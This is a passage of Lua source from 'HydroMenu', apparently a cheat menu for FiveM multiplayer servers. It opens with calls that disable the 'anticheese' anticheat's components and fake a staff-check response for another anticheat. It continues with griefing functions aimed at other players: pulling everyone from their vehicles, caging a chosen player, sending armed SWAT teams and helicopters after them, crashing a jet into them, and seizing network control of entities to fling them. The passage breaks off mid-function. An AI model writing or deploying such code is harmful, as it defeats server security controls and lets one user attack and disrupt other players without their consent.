		TriggerServerEvent("anticheese:SetComponentStatus", "Speedhack", false)
		TriggerServerEvent("anticheese:SetComponentStatus", "WeaponBlacklist", false)
		TriggerServerEvent("anticheese:SetComponentStatus", "CustomFlag", false)
		TriggerServerEvent("anticheese:SetComponentStatus", "Explosions", false)
		TriggerServerEvent("anticheese:SetComponentStatus", "CarBlacklist", false)
		PushNotification("Disabled Anticheese", 600)
	elseif string.find(anticheat, "badger") then
		TriggerEvent("Anticheat:CheckStaffReturn", true)
	end
end

local specialmessage = 1
local messsage = "Hydro   "

function HydroPlate()
    Citizen.CreateThread(function()
		while HydroVariables.VehicleOptions.Hydroplate do
			if specialmessage == 1 then
				messsage = "Hydro   "
			elseif specialmessage == 2 then
				messsage = "ydro    "
			elseif specialmessage == 3 then
				messsage = "dro     "
			elseif specialmessage == 4 then
				messsage = "ro      "
			elseif specialmessage == 5 then
				messsage = "o       "
			elseif specialmessage == 6 then
				messsage = "        "
			elseif specialmessage == 7 then
				messsage = "       H"
			elseif specialmessage == 8 then
				messsage = "      Hy"
			elseif specialmessage == 9 then
				messsage = "     Hyd"
			elseif specialmessage == 10 then
				messsage = "    Hydr"
			elseif specialmessage == 11 then
				messsage = "   Hydro"
			elseif specialmessage == 12 then
				messsage = "  Hydro "
			elseif specialmessage == 13 then
				messsage = " Hydro  "
			elseif specialmessage == 14 then
				messsage = "Hydro   "
			end
			if specialmessage > 13 then
				specialmessage = 1
			end
			local vehicle = GetVehiclePedIsIn(PlayerPedId())
			local lastveh = GetPlayersLastVehicle(PlayerPedId())
			SetVehicleNumberPlateText(vehicle, messsage)
			SetVehicleNumberPlateText(lastveh, messsage)
			specialmessage = specialmessage + 1
			Citizen.Wait(250)
			if killmenu then
				break
			end
		end
	end)
end

function HydroMenu.DoesServerHaveResource(resource)
	local resourcelist = GetResources()
	for i = 1, #resourcelist do
		if resourcelist[i] == resource then
			return true
		end
	end
	return false
end

function IsEntityAlreadyAdded(entity)
    for i = 1, #HydroMenu.Objectlist do
		local id = HydroMenu.Objectlist[i].ID
        if HydroMenu.Objectlist[i].ID == entity then
            return true
		end
	end
	return false
end

function TableHasValue(tab, val)
	for index, value in ipairs(tab) do
		if value == val then
            return true
        end
    end

    return false
end

function RemoveValueFromTable(tbl, val)
	for i, v in ipairs(tbl) do
	    if v == val then
		    return table.remove(tbl, i)
	    end
	end
end  

function ForceMod(Toggle)
    ForceTog = Toggle
    
    if ForceTog then
        
        Citizen.CreateThread(function()
			PushNotification("Force ~g~Enabled ~w~Press E to use", 600)
            
            local ForceKey = 38
            local KeyPressed = false
            local KeyTimer = 0
            local KeyDelay = 15
            local ForceEnabled = false
			local StartPush = false
			local Distance = 20
            
            function forcetick()
            
                if (KeyPressed) then
                    KeyTimer = KeyTimer + 1
                    if (KeyTimer >= KeyDelay) then
                        KeyTimer = 0
                        KeyPressed = false
                    end
				end
				
				DisableControlAction(0, 14, true)
				DisableControlAction(0, 15, true)
				DisableControlAction(0, 16, true)
				DisableControlAction(0, 17, true)
                
				if IsDisabledControlPressed(0, 15) then
					Distance = Distance + 1
				end
                
				if IsDisabledControlPressed(0, 14) then
					if Distance > 20 then
					    Distance = Distance - 1
					end
				end

                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
                    KeyPressed = true
                    ForceEnabled = true
                end
                
                if (StartPush) then
                    
                    StartPush = false
                    local pid = PlayerPedId()
                    local CamRot = GetGameplayCamRot(2)
                    
                    local force = 5
                    
                    local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
                    local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
                    local Fz = force * (CamRot.x * 0.2)
                    
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, false)
                        if IsEntityOnScreen(k) and k ~= PlayerVeh and  k ~= HydroVariables.VehicleOptions.PersonalVehicle then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= pid then
                            ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
                        end
                    end
                end
                
                if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
                    KeyPressed = true
                    StartPush = true
                    ForceEnabled = false
                end
                
                if (ForceEnabled) then
                    local pid = PlayerPedId()
                    local PlayerVeh = GetVehiclePedIsIn(pid, false)
                    
                    Markerloc = GetGameplayCamCoord() + (RotationToDirection(GetGameplayCamRot(2)) * Distance)
                    
                    DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, HydroMenu.rgb.r, HydroMenu.rgb.g, HydroMenu.rgb.b, 35, false, true, 2, nil, nil, false)
                    
                    for k in EnumerateVehicles() do
                        SetEntityInvincible(k, true)
                        if IsEntityOnScreen(k) and (k ~= PlayerVeh) and k ~= HydroVariables.VehicleOptions.PersonalVehicle then
                            RequestControlOnce(k)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                    
                    for k in EnumeratePeds() do
                        if IsEntityOnScreen(k) and k ~= PlayerPedId() then
                            RequestControlOnce(k)
                            SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
                            FreezeEntityPosition(k, false)
                            Oscillate(k, Markerloc, 0.5, 0.3)
                        end
                    end
                end
            end
            while ForceTog do forcetick() Wait(0) end
        end)
    else PushNotification("Force ~r~Disabled ~w~Press E to use", 600) end
end

function ShootAt(target, bone)
    local boneTarget = GetPedBoneCoords(target, GetEntityBoneIndexByName(target, bone), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(), boneTarget, true)
end

function RequestControlOnce(entity)
    if not NetworkIsInSession or NetworkHasControlOfEntity(entity) then
        return true
    end
    SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true)
    return NetworkRequestControlOfEntity(entity)
end

function Oscillate(entity, position, angleFreq, dampRatio)
    local pos1 = ScaleVector(SubVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq))
    local pos2 = AddVectors(ScaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1))
    local targetPos = SubVectors(pos1, pos2)
    
    ApplyForce(entity, targetPos)
end

function ScaleVector(vect, mult)
    return vector3(vect.x * mult, vect.y * mult, vect.z * mult)
end

function AddVectors(vect1, vect2)
    return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z)
end

function ApplyForce(entity, direction)
    ApplyForceToEntity(entity, 3, direction, 0, 0, 0, false, false, true, true, false, true)
end

function KickAllFromVeh()
	local playerlist = GetActivePlayers()
	
	for i = 1, #playerlist do
		Wait(50)
		local currPlayer = playerlist[i]
		if HydroVariables.AllOnlinePlayers.IncludeSelf and playerlist[i] ~= PlayerId() then
			ClearPedTasksImmediately(GetPlayerPed(currPlayer))
		elseif not HydroVariables.AllOnlinePlayers.IncludeSelf then
			ClearPedTasksImmediately(GetPlayerPed(currPlayer))
		end
	end
end

function AddRampToCar(player)
	local ped = GetPlayerPed(player)
	local vehi = GetVehiclePedIsIn(ped, 0)
	local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), 0, 0, 0, 1, 1, 1)
	AttachEntityToEntity(ramp, vehi, 0, 0.0, 5.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
end

function MaxOutEngine(veh, toggle)
	ToggleVehicleMod(veh, 2, toggle)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, toggle)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, toggle)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14) - 1, toggle)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, toggle)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17) - 1, toggle)
end

function MaxOut(veh)
	SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
	SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1, false)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
	ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1, false)
	SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38, GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1, true)
	SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
	SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
	SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function CagePlayer(player)
	local ped = GetPlayerPed(player)
	local coords = GetEntityCoords(ped)
	local inveh = IsPedInAnyVehicle(ped)

	if inveh then
		
		obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x -6.8, coords.y + 1, coords.z - 1.5, 0, 1, 1)
		SetEntityHeading(obj, 90.0)
		
		CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z - 1.5, 0, 1, 1)
		
	    CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z - 1.5, 0, 1, 1)

		obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z - 1.5, 0, 1, 1)
		SetEntityHeading(obj2, 90.0)
		
		obj = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x -6.8, coords.y + 1, coords.z + 1.3, 0, 1, 1)
		SetEntityHeading(obj, 90.0)
		
		CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y + 6.8, coords.z + 1.3, 0, 1, 1)
		
	    CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x - 0.6, coords.y - 4.8, coords.z + 1.3, 0, 1, 1)

		obj2 = CreateObject(GetHashKey("prop_const_fence03b_cr"), coords.x + 4.8, coords.y + 1, coords.z + 1.3, 0, 1, 1)
		SetEntityHeading(obj2, 90.0)
	else

	local obj = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, 1, 1, 1)
	FreezeEntityPosition(obj, true)
	local obj2 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, 1, 1, 1)
	SetEntityHeading(obj2, 90.0)
	FreezeEntityPosition(obj2, true)
	local obj3 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, 1, 1, 1)
	FreezeEntityPosition(obj3, true)
	local obj4 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, 1, 1, 1)
	SetEntityHeading(obj4, 90.0)
	FreezeEntityPosition(obj4, true)
	local obj5 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, 1, 1, 1)
	FreezeEntityPosition(obj5, true)
	local obj6 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
	SetEntityHeading(obj6, 90.0)
	FreezeEntityPosition(obj6, true)
	local obj7 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, 1, 1, 1)
	FreezeEntityPosition(obj7, true)
	local obj8 = CreateObject(GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
	SetEntityHeading(obj8, 90.0)
	FreezeEntityPosition(obj8, true)

	end
end

function UFOVeh(player)
	local ped = GetPlayerPed(player)
	local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 8.0, 0.5)
	local x = coords.x
	local y = coords.y
	local z = coords.z
	if not HasModelLoaded(GetHashKey("hydra")) then
		RequestModel(GetHashKey("hydra"))
		Wait(500)
	end

	local vehi = CreateVehicle(GetHashKey("hydra"), x, y, z, 0.0, 1, 1)
	Wait(50)
	if DoesEntityExist(vehi) then
		SetVehicleEngineTorqueMultiplier(vehi, 8000)
		SetVehicleEnginePowerMultiplier(vehi, 600)
		local ufoprop = CreateObject(GetHashKey("p_spinning_anus_s"), x, y, z, 1, 1, 0)
		SetEntityHeading(vehi, GetEntityHeading(ped))
		SetPedIntoVehicle(ped, vehi, -1)
		SetEntityCollision(ufoprop, false, true)
		AttachEntityToEntity(ufoprop, vehi, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
	else
		return
	end
end

function ScreenToWorld(screenCoord)
    local camRot = GetGameplayCamRot(2)
    local camPos = GetGameplayCamCoord()
    
    local vect2x = 0.0
    local vect2y = 0.0
    local vect21y = 0.0
    local vect21x = 0.0
    local direction = RotationToDirection(camRot)
    local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0)
    local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0)
    
    local direction1 = RotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - RotationToDirection(vect32)
    local direction2 = RotationToDirection(vect3) - RotationToDirection(vect31)
    local radians = -(math.rad(camRot.y))
    
    vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians))
    vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians))
    
    local case1, x1, y1 = WorldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34)
    if not case1 then
        vect2x = x1
        vect2y = y1
        return camPos + (direction * 10.0)
    end
    
    local case2, x2, y2 = WorldToScreenRel(camPos + (direction * 10.0))
    if not case2 then
        vect21x = x2
        vect21y = y2
        return camPos + (direction * 10.0)
    end
    
    if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then
        return camPos + (direction * 10.0)
    end
    
    local x = (screenCoord.x - vect21x) / (vect2x - vect21x)
    local y = (screenCoord.y - vect21y) / (vect2y - vect21y)
    return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y)
end

function SubVectors(vect1, vect2)
    return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z)
end

function WorldToScreenRel(worldCoords)
    local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z)
    if not check then
        return false
    end
    
    screenCoordsx = (x - 0.5) * 2.0
    screenCoordsy = (y - 0.5) * 2.0
    return true, screenCoordsx, screenCoordsy
end

function RotationToDirection(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function GetCamDirection()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(PlayerPedId())
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

function GetCamDirFromScreenCenter()
    local pos = GetGameplayCamCoord()
    local world = ScreenToWorld(0, 0)
    local ret = SubVectors(world, pos)
    return ret
end

function RampCar(player)
	local ped = GetPlayerPed(player)
	local coords = GetOffsetFromEntityInWorldCoords(ped, 0.0, 8.0, 0.5)
	local x = coords.x
	local y = coords.y
	local z = coords.z

	if not HasModelLoaded(GetHashKey("t20")) then
		RequestModel(GetHashKey("t20"))
		Wait(500)
	end

	local vehi = CreateVehicle(GetHashKey("t20"), x, y, z, 0.0, 1, 1)
	Wait(50)
	if DoesEntityExist(vehi) then
	    local ramp = CreateObject(GetHashKey("prop_jetski_ramp_01"), x, y, z - 1, 1, 1, 1)
		SetEntityHeading(vehi, GetEntityHeading(ped))
		SetPedIntoVehicle(ped, vehi, -1)
		AttachEntityToEntity(ramp, vehi, 0, 0.0, 3.0, 0.0, 0.0, 0.0, 180.0, false, false, true, false, 0, true)
		SetVehicleCustomPrimaryColour(vehi, 0, 0, 0)
		SetVehicleCustomSecondaryColour(vehi, 0, 0, 0)
		MaxOut(vehi)
	else
        return
	end
end

function SWATTeamPullUp(player)
	for i = 1, 1 do
		local ped = GetPlayerPed(player)
		local coords = GetEntityCoords(ped)

		local ret, x, y, z = GetClosestRoad(coords.x + 100.0, coords.y + 125.0, coords.z, 1, 1)

		local pedmodel = "s_m_y_swat_01"
		local carmodel = "riot"

		RequestModel(GetHashKey(pedmodel))
		RequestModel(GetHashKey(carmodel))

		local loadattemps = 0

		while not HasModelLoaded(GetHashKey(pedmodel)) and not HasModelLoaded(GetHashKey(carmodel)) do
			loadattemps = loadattemps + 1
			Citizen.Wait(1)
			if loadattemps > 10000 then
    	        break
			end
		end

		local nped = CreatePed(31, pedmodel, x, y, z, 0.0, true, true)
		local nped2 = CreatePed(31, pedmodel, x, y, z, 0.0, true, true)
		local nped3 = CreatePed(31, pedmodel, x, y, z, 0.0, true, true)
		local nped4 = CreatePed(31, pedmodel, x, y, z, 0.0, true, true)

		local veh = CreateVehicle(GetHashKey(carmodel), x, y, z, GetEntityHeading(ped), 1, 1)
		
		SetVehicleSiren(veh, true)
	
		ClearPedTasks(nped)
	
		GiveWeaponToPed(nped, "WEAPON_ASSAULTRIFLE", 9999, false, true)
		GiveWeaponToPed(nped2, "WEAPON_ASSAULTRIFLE", 9999, false, true)
		GiveWeaponToPed(nped3, "WEAPON_ASSAULTRIFLE", 9999, false, true)
		GiveWeaponToPed(nped4, "WEAPON_MINIGUN", 9999, false, true)
	
		if DoesEntityExist(veh) then
			SetPedIntoVehicle(nped, veh, -1)
			SetPedIntoVehicle(nped2, veh, 0)
			SetPedIntoVehicle(nped3, veh, 1)
			SetPedIntoVehicle(nped4, veh, 2)
		else
			DeleteEntity(nped)
			DeleteEntity(nped2)
			DeleteEntity(nped3)
			DeleteEntity(nped4)
			DeleteEntity(veh)
		end

		TaskVehicleDriveToCoord(nped, veh, coords.x + 7 * i, coords.y + 7 * i, coords.z, 200.0, 40.0, GetHashKey(veh), 6, 1.0, true)
		
		TaskCombatPed(nped2, GetPlayerPed(selectedPlayer), true, true)
		TaskCombatPed(nped3, GetPlayerPed(selectedPlayer), true, true)
		TaskCombatPed(nped4, GetPlayerPed(selectedPlayer), true, true)

		SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped))
		SetRelationshipBetweenGroups(5, GetHashKey(nped), GetHashKey(ped))
		SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped2))
		SetRelationshipBetweenGroups(5, GetHashKey(nped2), GetHashKey(ped))
		SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped))
		SetRelationshipBetweenGroups(5, GetHashKey(nped3), GetHashKey(ped))
		SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped3))
		SetRelationshipBetweenGroups(5, GetHashKey(nped4), GetHashKey(ped))
		SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped4))

		SetPedKeepTask(nped, true)
		SetPedKeepTask(nped2, true)
		SetPedKeepTask(nped3, true)
		SetPedKeepTask(nped4, true)

		SetVehicleOnGroundProperly(veh)
    end
end

function StartFireworks()
	Citizen.CreateThread(function()
		box = nil

		if not HasNamedPtfxAssetLoaded("scr_indep_fireworks") then
			RequestNamedPtfxAsset("scr_indep_fireworks")
			while not HasNamedPtfxAssetLoaded("scr_indep_fireworks") do
			   Wait(10)
			end
		end
	
		local pedcoords = GetEntityCoords(GetPlayerPed(-1))
		local ped = GetPlayerPed(-1)
		local times = 20
	
		   
		box = CreateObject(GetHashKey('ind_prop_firework_03'), pedcoords, true, false, false)
		PlaceObjectOnGroundProperly(box)
		FreezeEntityPosition(box, true)
		local firecoords = GetEntityCoords(box)
	    DeleteEntity(box)

		repeat
		UseParticleFxAssetNextCall("scr_indep_fireworks")
		local part1 = StartNetworkedParticleFxNonLoopedAtCoord("scr_indep_firework_trailburst", firecoords, 0.0, 0.0, 0.0, 1.0, false, false, false, false)
		times = times - 1
		Citizen.Wait(2000)
		until(times == 0)
		DeleteEntity(box)
		box = nil
	end)
end

function TeleportToCoords(x, y, z, heading)
	if HydroVariables.TeleportOptions.smoothteleport then
		SwitchOutPlayer(PlayerPedId(), 0, 1)
		Wait(800)
		if IsPedInAnyVehicle(PlayerPedId(), false) then
			SetEntityCoords(GetPlayersLastVehicle(), x, y, z)
			SetPedIntoVehicle(PlayerPedId(), playersveh, -1)
		else
			SetEntityCoords(PlayerPedId(), x, y, z)
		end
		SwitchInPlayer(PlayerPedId())
	else
		if IsPedInAnyVehicle(PlayerPedId(), false) then
			SetEntityCoords(GetPlayersLastVehicle(), x, y, z)
		else
			SetEntityCoords(PlayerPedId(), x, y, z)
		end
	end
end

function FlyPlaneIntoPlayer(player)
	
	local ped = GetPlayerPed(player)
	local coords = GetEntityCoords(ped)
	
	local pedmodel = "a_m_m_eastsa_01"
	local planemodel = "jet"

	RequestModel(GetHashKey(pedmodel))
	RequestModel(GetHashKey(planemodel))

    local loadattemps = 0

	while not HasModelLoaded(GetHashKey(pedmodel)) do
		loadattemps = loadattemps + 1
		Citizen.Wait(1)
		if loadattemps > 10000 then
            break
		end
	end

	while not HasModelLoaded(GetHashKey(planemodel)) and loadattemps < 10000 do
		Wait(500)
	end

	
	local nped = CreatePed(31, pedmodel, coords.x, coords.y, coords.z, 0.0, true, true)

	local veh = CreateVehicle(GetHashKey(planemodel), coords.x, coords.y, coords.z + 250.0, GetEntityHeading(ped), 1, 1)
	
	SetVehicleEngineOn(veh, true, true, true)

	ClearPedTasks(nped)
	
	SetPedIntoVehicle(nped, veh, -1)

	-- SetPedIntoVehicle(PlayerPedId(), veh, 0)

	SetEntityRotation(veh, -90.0, 0.0, 0.0, 0.0, true)

	SetVehicleForwardSpeed(veh, 336.0)

	-- TaskVehicleDriveToCoord(nped, veh, coords.x, coords.y, coords.z + 10.0, 10.0, true, GetHashKey(veh), 5, 1.0, true)
	
	SetPedKeepTask(nped, true)
end

function HelicopterChase(player)

	ped = GetPlayerPed(player)
	coords = GetEntityCoords(ped)
	
	local pedmodel = "a_m_m_eastsa_01"
	local planemodel = "buzzard2"

	RequestModel(GetHashKey(pedmodel))
	RequestModel(GetHashKey(planemodel))

    local loadattemps = 0

	while not HasModelLoaded(GetHashKey(pedmodel)) do
		loadattemps = loadattemps + 1
		Citizen.Wait(1)
		if loadattemps > 10000 then
            break
		end
	end

	while not HasModelLoaded(GetHashKey(planemodel)) and loadattemps < 10000 do
		Wait(500)
	end

	local nped = CreatePed(31, pedmodel, coords.x, coords.y, coords.z, 0.0, true, true)

	local veh = CreateVehicle(GetHashKey(planemodel), coords.x, coords.y + 15.0, coords.z + 60.0, GetEntityHeading(ped), 1, 1)
	
	local nped2 = CreatePedInsideVehicle(veh, 31, pedmodel, 0, true, true)
	local nped3 = CreatePedInsideVehicle(veh, 31, pedmodel, 1, true, true)
	local nped4 = CreatePedInsideVehicle(veh, 31, pedmodel, 2, true, true)

	ClearPedTasks(nped)
	
	SetPedIntoVehicle(nped, veh, -1)
	SetPedIntoVehicle(nped2, veh, 0)
	SetPedIntoVehicle(nped3, veh, 1)
	SetPedIntoVehicle(nped4, veh, 2)

	GiveWeaponToPed(nped2, "WEAPON_ASSAULTRIFLE", 9999, false, true)
	GiveWeaponToPed(nped3, "WEAPON_ASSAULTRIFLE", 9999, false, true)
	GiveWeaponToPed(nped4, "WEAPON_ASSAULTRIFLE", 9999, false, true)
	
	SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped))
	SetRelationshipBetweenGroups(5, GetHashKey(nped), GetHashKey(ped))

	SetRelationshipBetweenGroups(5, GetHashKey(ped), GetHashKey(nped2))
	SetRelationshipBetweenGroups(5, GetHashKey(nped2), GetHashKey(ped))

	SetVehicleEngineOn(veh, 10, true, false)

	TaskVehicleChase(nped, GetPlayerPed(selectedPlayer))

	SetPedKeepTask(nped, true)
	
	SetPedCanSwitchWeapon(nped2, true)
	SetPedCanSwitchWeapon(nped3, true)
	SetPedCanSwitchWeapon(nped4, true)
	
	SetEntityInvincible(nped, true)
